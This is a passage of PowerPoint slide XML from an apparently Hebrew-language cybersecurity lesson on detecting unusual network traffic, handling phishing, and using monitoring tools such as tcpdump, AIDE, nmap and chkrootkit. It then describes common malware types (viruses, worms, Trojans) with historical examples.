        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DBAC3D66-7B59-4180-8429-803A2287AEC6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. זיהוי תעבורה לא שגרתית ברשת חשוב כי הוא יכול להצביע על ניסיונות חדירה למערכת, על מתקפות מסוג </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DDoS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> או על שליחת מידע רגיש החוצה מהמוסד ללא אישור. ניטור תעבורה בלתי רגילה מאפשר לזהות פעילות חשודה בזמן אמת ולהגיב במהירות כדי למנוע נזקים פוטנציאליים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>5. כדי להתמודד עם ניסיונות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פישינג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>, יש לנקוט בצעדים הבאים:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>א. הימנעות מללחוץ על קישורים או לפתוח קבצים מצורפים ממיילים לא מוכרים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ב. אימות זהות השולח דרך ערוצים אחרים לפני ביצוע פעולה כלשהי.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ג. דיווח על המייל החשוד לצוות האבטחה של הארגון.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ד. שימוש בכלי סינון מיילים המזהים מיילים חשודים ומעבירים אותם להסגר.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ה. חינוך והעלאת מודעות בקרב העובדים כדי שיזהו ניסיונות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פישינג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> וידעו כיצד לפעול.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4160076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6707467-D74A-4CC6-BE52-F09B2F4727DE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="218661" y="642594"/>
            <a:ext cx="11648661" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ננסה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>לנטר</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> את התעבורה ברשת ולמפות דברים עוינים</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{32F2C30E-291E-46C8-926E-0B54B7CDF5FB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שלב 1: ניטור תעבורה רשת</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ניתן להשתמש בכלי כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Wireshark</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> או </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>tcpdump</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כדי ללכוד ולנתח תעבורה רשת. (כמובן לפני זה לבדוק את היציאה שלנו על ידי </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>ifconfig </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> או </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> a</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tcpdump</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> eth0 -w </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>suspicious_traffic.pcap</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הפקודה הזו תתחיל ללכוד תעבורה שנכנסת ויוצאת דרך ממשק </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>eth0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ותשמור אותה בקובץ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>suspicious_traffic.pcap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שניתן לנתח לאחר מכן.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שלב 2: ניתוח לוגים</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אפשר לנתח קבצי לוג כדי לזהות פעילויות חשודות. לדוגמה, באמצעות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>Logwatch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>או </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Splunk</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ניתן לסרוק לוגים של מערכות ולזהות דפוסים חריגים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> cat /var/log/auth.log | grep "Failed"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הפקודה הזו תציג את כל הניסיונות הכושלים לכניסה למערכת שנרשמו בקובץ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>auth.log</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="371825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8B0AD5-50D5-4F16-9394-1276C598C0FB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="248478" y="125760"/>
            <a:ext cx="11943522" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ננסה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>לנטר</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> את התעבורה ברשת ולמפות דברים עוינים</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9FCDBCA3-6145-4736-B0A1-BBF25F06C075}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1417318"/>
            <a:ext cx="10058400" cy="5241899"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שלב 3: סריקת שינויים במערכת קבצים</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>באמצעות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>AIDE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (Advanced Intrusion Detection Environment) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אפשר לזהות שינויים בקבצים שיכולים להעיד על חדירה למערכת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> aide --check</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הפקודה הזו תבדוק את המערכת על פי המדדים שהוגדרו מראש ותדווח על שינויים חשודים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שלב 4: סריקת פורטים פתוחים</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כלי כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> יכול לסייע בזיהוי פורטים פתוחים שלא אמורים להיות פעילים, או ניסיונות לסרוק את הרשת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> -p- -T4 192.168.1.0/24</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הפקודה הזו תסרוק את כל הפורטים ברשת המקומית ותדווח על פורטים פתוחים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שלב 5: זיהוי תוכנות זדוניות</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>באמצעות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>Chkrootkit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>או </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>rkhunter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> אפשר לבדוק אם קיימות תוכנות זדוניות שהותקנו במערכת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>chkrootkit</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הפקודה הזו תבצע סריקה של המערכת כדי לבדוק אם קיימים </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>rootkits</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2348090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84D87963-2E18-4C9D-B157-7D61412BD5E1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2262146"/>
            <a:ext cx="10058400" cy="3931920"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="he-IL" sz="7200" dirty="0"/>
              <a:t>סוגי תוכנות זדוניות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2842787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646452-BE3D-478D-B978-FC53047C554E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6420678" y="642594"/>
            <a:ext cx="4704522" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מהי תוכנה זדונית?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9B296EDC-3F4D-4965-82CD-6B2D220C5B40}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תוכנה זדונית </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Malware</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> היא כל תוכנה שנועדה להזיק, לשבש או להשיג גישה לא מורשית למחשב או לרשת. המטרות של התוכנות הזדוניות יכולות להיות מגוונות, כגון גניבת מידע אישי, השבתת מערכות, או ניצול משאבים למטרות זדוניות אחרות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ונראה להלם שישנם מספר סוגים של תוכנות זדוניות:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2699624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D290EAD-31DB-48C2-955B-AC916D5CF083}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6390860" y="642594"/>
            <a:ext cx="4734339" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>סוגי תוכנות זדוניות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9B472A60-EE70-4A26-8742-E0CC91DD2A84}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" dirty="0"/>
              <a:t>1.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" dirty="0"/>
              <a:t>וירוסים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>Viruses</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>וירוס הוא סוג של תוכנה זדונית שמתחבר לתוכנה לגיטימית ומופעל יחד </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>איתה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>. ברגע שהקובץ הנגוע מופעל, הווירוס יכול להדביק קבצים נוספים, לגרום נזק למערכת, או להפיץ את עצמו למחשבים אחרים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמה:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> וירוס</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Melissa </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שנוצר ב-1999 התפשט דרך דואר אלקטרוני וגרם להאטת שרתים רבים בעולם.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" dirty="0"/>
              <a:t>2.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" dirty="0"/>
              <a:t>תולעים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>Worms</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תולעים הן תוכנות זדוניות שיכולות לשכפל את עצמן ולהתפשט לרשתות מחשבים ללא צורך בתוכנה מארחת. התולעים משתמשות ברשת כדי להפיץ את עצמן ולעיתים קרובות גורמות לקריסה של מערכות על ידי ניצול משאבים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמה:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> תולעת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Code Red</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מ-2001 הצליחה להדביק למעלה מ-359,000 מערכות בתוך פחות מ-14 שעות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1285460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C7D317C-FFF8-49DF-A58C-C1C2AA88E95D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4263886" y="642594"/>
            <a:ext cx="6861313" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - סוגי תוכנות זדוניות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1E07C1E2-349B-4CE9-BCA1-0DFB43D5F521}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" dirty="0"/>
              <a:t>סוסים טרויאניים </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>Trojans</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>סוס טרויאני הוא תוכנה שנראית כאילו היא לגיטימית, אבל ברגע שמורידים או מפעילים אותה, היא מאפשרת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>להאקרים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> גישה למחשב הנפגע. הסוס הטרויאני לא משכפל את עצמו כמו וירוסים ותולעים, אלא הוא משמש כ"טריק" כדי להכניס את התוקף למערכת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמה:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> סוס טרויאני בשם </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Zeus</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שנעשה בו שימוש לגניבת נתוני בנקאות באינטרנט.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" dirty="0"/>
              <a:t>4. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>רוגלות</a:t>
